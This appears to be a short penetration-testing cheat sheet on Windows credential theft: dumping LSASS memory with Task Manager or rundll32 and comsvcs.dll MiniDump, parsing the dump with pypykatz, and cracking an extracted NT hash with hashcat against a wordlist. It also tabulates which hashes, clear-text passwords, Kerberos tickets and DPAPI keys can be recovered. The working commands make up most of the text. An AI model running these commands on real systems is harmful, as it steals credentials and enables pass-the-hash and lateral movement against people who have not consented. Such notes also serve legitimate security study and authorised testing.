
## Task Manager (GUI Only)

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

A file called `lsass.DMP` is created and saved in `%temp%.

---

## Rundll32.exe & Comsvcs.dll

We must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

```PowerShell
C:\Windows\system32> tasklist /svc

PS C:\Windows\system32> Get-Process lsass

PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
### creating a DUMP File through PS
```

---
## [pypykatz](https://github.com/skelsec/pypykatz)

```shell
pypykatz lsa minidump lsass.dmp 
```
### Output
| Authentication Package                                                                                    | Cached Data in LSASS         | What Can Be Extracted                                            | Security Impact                                                                                                                   |
| --------------------------------------------------------------------------------------------------------- | ---------------------------- | ---------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) (MSV1_0)** | Logon session information    | SID, Username, Domain, NT hash, SHA1 hash                        | Extracted password hashes can be used for authentication attacks such as pass-the-hash.                                           |
| **WDIGEST**                                                                                               | User credentials             | Clear-text password (when WDIGEST credential caching is enabled) | Clear-text passwords can be recovered directly from LSASS memory.                                                                 |
| **[Kerberos](https://web.mit.edu/kerberos/#what_is)**                                                     | Kerberos authentication data | Passwords, encryption keys (ekeys), tickets, and PINs            | Extracted tickets and keys can be used to authenticate to other systems within the same domain.                                   |
| **DPAPI**                                                                                                 | DPAPI master keys            | Master keys used to decrypt application secrets                  | Master keys can decrypt credentials and other sensitive data protected by DPAPI, such as saved passwords and application secrets. |

---

## Cracking the NT Hash with Hashcat

```shell
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

---